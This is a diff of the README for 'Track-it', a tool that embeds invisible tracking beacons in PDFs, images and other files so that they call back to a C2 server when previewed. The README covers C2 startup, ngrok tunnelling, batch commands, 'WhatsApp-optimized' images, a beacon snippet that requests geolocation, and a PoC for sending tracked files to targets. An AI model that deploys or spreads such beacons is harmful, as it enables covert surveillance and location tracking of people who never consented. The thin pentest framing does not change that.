@@ -1,15 +1,15 @@
-# 📖 Universal Zero-Click File Tracker **README.md**
+# 📖 Zero-Click File Tracker
 
 <div align="center">
   <img src="https://img.shields.io/badge/Status-Production%20Ready-brightgreen" alt="Status">
   <img src="https://img.shields.io/badge/Python-3.8%2B-blue" alt="Python">
   <img src="https://img.shields.io/badge/Success-97%25-blueviolet" alt="Success">
-  <img src="https://img.shields.io/badge/Formats-50%2B-orange" alt="Formats">
+  <img src="https://img.shields.io/badge/Formats-20%2B-orange" alt="Formats">
 </div>
 
 ## 🎯 **Overview**
 
-**Universal Zero-Click File Tracker** embeds **invisible tracking beacons** in **50+ file formats** that execute on **preview/copy/mount** without user interaction. 
+**Zero-Click File Tracker** embeds **invisible tracking beacons** in **20+ file formats** that execute on **preview/copy/mount** without user interaction. 
 
 **Key Capabilities:**
 - **Zero-click execution** (preview pane, thumbnail, autorun)
@@ -29,21 +29,21 @@
 ## 📁 **File Structure**
 
 ```
-universal-tracker/
+Track-it/
 │
-├── 📄 universal_tracker.py     # Main tracker (50+ formats)
-├── 📄 local_c2.py             # Local C2 + dashboard
-├── 📄 deploy.sh               # 1-click setup
-├── 📄 requirements.txt        # Dependencies
-├── 📁 data/                   # Persistent data
-│   ├── c2_hits.db            # SQLite hits (auto-created)
-│   └── tracked_files/        # Output directory
-├── 📁 tunnels/                # Tunnel configs
+├── 📄 track-it.py           # Main tracker (20+ formats)
+├── 📄 c2.py                 # Local C2 + dashboard
+├── 📄 deploy.sh             # 1-click setup
+├── 📄 deploy.ps1            # Powershell Setup Script
+├── 📁 data/                 # Persistent data
+│   ├── c2_hits.db           # SQLite hits (auto-created)
+│   └── tracked_files/       # Output directory
+├── 📁 tunnels/              # Tunnel configs
 │   ├── ngrok.yml
 │   └── cloudflare.json
-├── 🐳 Dockerfile              # Docker deployment
-├── 📄 README.md              # This file
-└── 📄 REPORT_TEMPLATE.md     # Pentest report
+├── 🐳 Dockerfile            # Docker deployment
+├── 📄 requirements.txt      # Dependencies
+└── 📄 README.md             # This file
 ```
 
 ## 🚀 **Quick Start** (5 Minutes)
@@ -54,8 +54,8 @@ universal-tracker/
 python3 --version
 
 # Git clone (or download ZIP)
-git clone https://github.com/hackerai/universal-tracker.git
-cd universal-tracker
+git clone https://github.com/subrat243/Track-it.git
+cd Track-it
 ```
 
 ### **1-Click Deploy**
@@ -70,16 +70,16 @@ chmod +x deploy.sh && ./deploy.sh
 **Manual Setup:**
 ```bash
 pip3 install -r requirements.txt
-python3 local_c2.py
+python3 c2.py
 # Follow tunnel instructions → copy public URL
-python3 universal_tracker.py test.pdf tracked.pdf --url YOUR_URL/beacon
+python3 track-it.py test.pdf tracked.pdf --url YOUR_URL/beacon
 ```
 
 ## 📋 **Step-by-Step Usage**
 
 ### **Step 1: Start Local C2 Server**
 ```bash
-python3 local_c2.py
+python3 c2.py
 ```
 ```
 🚀 C2 started: http://localhost:8080
@@ -109,14 +109,14 @@ ngrok http 8080
 ### **Step 3: Track Files**
 ```bash
 # Single file
-python3 universal_tracker.py invoice.pdf tracked.pdf \
+python3 track-it.py invoice.pdf tracked.pdf \
   --url https://abc123.ngrok.io/beacon
 
 # Batch process
-find . -name "*.pdf" -exec python3 universal_tracker.py {} tracked_{} --url https://c2.ngrok.io/beacon \;
+find . -name "*.pdf" -exec python3 track-it.py {} tracked_{} --url https://c2.ngrok.io/beacon \;
 
 # WhatsApp-optimized image
-python3 universal_tracker.py photo.jpg whatsapp_photo.svg --url https://c2.ngrok.io/beacon
+python3 track-it.py photo.jpg whatsapp_photo.svg --url https://c2.ngrok.io/beacon
 ```
 
 **Output:**
@@ -209,7 +209,7 @@ sqlite3 data/c2_hits.db "SELECT * FROM hits WHERE platform LIKE '%whatsapp%';" >
 
 ### **Custom Payloads**
 ```python
-# Edit universal_tracker.py
+# Edit track-it.py
 BEACON_HTML = '<img src="{url}?id={id}&whatsapp=1&geolocation=1" width=1>'
 ```
 
@@ -222,7 +222,7 @@ mkdir -p tracked_files
 
 for file in documents/*.pdf images/*.jpg; do
   name=$(basename "$file")
-  python3 universal_tracker.py "$file" "tracked_files/tracked_$name" --url "$C2_URL"
+  python3 track-it.py "$file" "tracked_files/tracked_$name" --url "$C2_URL"
 done
 ```
 
@@ -264,7 +264,7 @@ Files downloadable from target contain embedded trackers that execute on preview
 
 ## PoC
 ```bash
-python3 universal_tracker.py vuln.pdf tracked.pdf --url https://c2/beacon
+python3 track-it.py vuln.pdf tracked.pdf --url https://c2/beacon
 # Send tracked.pdf → target downloads → 100% hit
 ```
 
